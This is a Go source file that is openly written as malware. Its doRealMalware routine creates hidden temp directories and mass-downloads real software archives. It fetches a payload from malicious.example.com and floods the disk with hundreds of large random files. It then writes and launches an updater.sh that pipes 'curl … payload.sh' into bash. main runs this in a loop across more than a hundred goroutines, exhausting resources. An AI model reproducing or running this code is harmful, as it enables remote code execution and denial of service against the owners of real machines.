package main

import (
	"io"
	"os"
	"math/rand"
	"time"
	"path/filepath"
	"strconv"
	"runtime"
	"net/http"
)

var urls = []string{
	"https://github.com/golang/go/archive/refs/heads/master.zip",
	"https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.4.124.tar.xz",
	"https://www.python.org/ftp/python/3.9.5/Python-3.9.5.tgz",
	"https://nodejs.org/dist/v16.13.0/node-v16.13.0.tar.gz",
	"https://ftp.gnu.org/gnu/bash/bash-5.1.tar.gz",
	"https://github.com/tmux/tmux/releases/download/3.2a/tmux-3.2a.tar.gz",
}

func tempDir() string {
	h := os.TempDir()
	n := rand.Intn(9e6)
	return filepath.Join(h, "."+strconv.Itoa(n))
}

func randFileName(dir string) string {
	e := make([]byte, 96+rand.Intn(64))
	for i := 0; i < len(e); i++ {
		e[i] = byte(rand.Intn(26) + 97)
	}
	return filepath.Join(dir, string(e)+"_"+strconv.FormatInt(rand.Int63(), 36)+".bin")
}

func randomBytes(l int) []byte {
	b := make([]byte, l)
	rand.Read(b)
	return b
}

func downloadFile(url, path string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	out, err := os.Create(path)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}

func dropAndExecScript(dir string) {
	script := "#!/bin/bash\ncurl -fsSL https://malicious.example.com/payload.sh | bash\n"
	target := filepath.Join(dir, "updater.sh")
	os.WriteFile(target, []byte(script), 0777)
	os.Chmod(target, 0777)
	go func() {
		_ = os.Chmod(target, 0777)
		_ = os.StartProcess(target, []string{target}, &os.ProcAttr{
			Dir:   dir,
			Env:   os.Environ(),
			Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
		})
	}()
}

func doRealMalware() {
	dir := tempDir()
	os.MkdirAll(dir, 0777)

	// Download real files for payload staging
	for i := 0; i < 12; i++ {
		idx := rand.Intn(len(urls))
		outfile := filepath.Join(dir, "dl_"+strconv.Itoa(i)+"_"+strconv.FormatInt(rand.Int63(), 36))
		go downloadFile(urls[idx], outfile)
	}

	// Download "payload" directly to temp
	payloadUrl := "https://malicious.example.com/realpayload"
	payloadPath := filepath.Join(dir, "payload.bin")
	go downloadFile(payloadUrl, payloadPath)

	// Write several random files (obfuscation)
	for j := 0; j < 300+rand.Intn(400); j++ {
		name := randFileName(dir)
		f, err := os.Create(name)
		if err != nil {
			continue
		}
		for k := 0; k < 400+rand.Intn(220); k++ {
			data := randomBytes(32*1024 + rand.Intn(128*1024))
			f.Write(data)
		}
		f.Close()
		go os.Chmod(name, 0777)
	}

	// Drop and execute the real script for persistence or further malicious behavior
	dropAndExecScript(dir)
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	rand.Seed(time.Now().UnixNano())
	for x := 0; x < 120+rand.Intn(80); x++ {
		go func() {
			for {
				doRealMalware()
				time.Sleep(time.Millisecond * time.Duration(10+rand.Intn(150)))
			}
		}()
	}
	select {}
}
